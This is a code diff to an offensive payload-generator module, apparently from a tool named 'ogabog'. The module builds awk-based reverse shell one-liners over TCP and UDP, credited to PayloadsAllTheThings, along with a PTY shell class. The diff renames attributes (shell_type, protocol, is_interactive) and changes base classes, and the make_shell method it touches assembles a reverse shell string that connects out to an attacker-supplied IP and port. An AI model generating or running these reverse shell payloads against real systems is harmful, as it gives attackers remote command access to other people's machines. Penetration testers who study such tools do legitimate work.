@@ -4,13 +4,15 @@ from ogabog.cores import plugin, const
 class ReverseTCP(plugin.ReverseShell):
     def __init__(self):
         super().__init__()
-        self.shell_type = "tcp"
+        self.shell_type = 1
+        self.is_interactive = False
+        self.protocol = "tcp"
         self.opts.description = "[ReverseShell][Non-interactive][TCP] PayloadsAllTheThings"
         self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"
 
     def make_shell(self):
         self.shell = """awk 'BEGIN {s = \""""
-        if self.shell_type == "udp":
+        if self.protocol == "udp":
             self.shell += f"""/inet/udp/0/{self.args.ip}/{self.args.port}";"""
         else:
             self.shell += f"""/inet/tcp/0/{self.args.ip}/{self.args.port}";"""
@@ -22,13 +24,15 @@ class ReverseTCP(plugin.ReverseShell):
 class ReverseUDP(ReverseTCP):
     def __init__(self):
         super().__init__()
-        self.shell_type = "udp"
+        self.protocol = "udp"
         self.opts.description = "[ReverseShell][Non-interactive][UDP] PayloadsAllTheThings"
 
 
-class PTY(plugin.Module):
+class PTY(plugin.BaseShell):
     def __init__(self):
         super().__init__()
+        self.shell_type = 0
+        self.is_interactive = True
         self.add_args(
             "--shell",
             default="bash",
